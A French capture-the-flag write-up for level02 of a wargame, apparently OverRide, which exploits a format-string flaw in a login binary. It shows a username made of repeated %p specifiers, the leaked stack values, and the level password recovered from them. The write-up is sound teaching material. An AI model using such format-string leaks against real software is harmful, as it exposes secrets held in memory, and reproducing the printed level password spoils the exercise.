#### Etape 1 : Décompilation 

Le binaire effectue un open puis read du mot fichier contenant le mot de passe.
Il demande ensuite un username puis un password.
Si le mot de passe est bon il éxécute un /bin/sh.

#### Etape 2 : Recherche de faille

Le mot de passe semble faire 40 caractères selon la décompilation du binaire. (Vu dans les arguments du fread).
La seule faille visible semble être le printf a la fin du programme qui prend en argument la chaine de caractère qui correspond au username.
Autrement dit le programme est sensible a une format attack.

#### Etape 3 : Idée

Print le contenu des adresses pour obtenir le mot de passe.
En envoyant un %p on vois le contenu d'une adresse mémoire en hexadécimal.
Donc en essayant de print plusieurs adresse il est fort possible de trouver une suite ressemblant au mot de passe sous forme d'une chaine d'héxadécimaux. 

#### Etape 4 : Execution 

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
--[ Password: *****************************************
0x7fffffffe3e0 (nil) 0x25 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe5d8 0x1f7ff9a08 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
```

#### Etape 5 : Conversion

De la 22e adresse a la 26e il y a 80 caractères ... donc une fois convertir en décimal 40.
On les converti avec un script puis on obtient : 
Mot de passe : Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H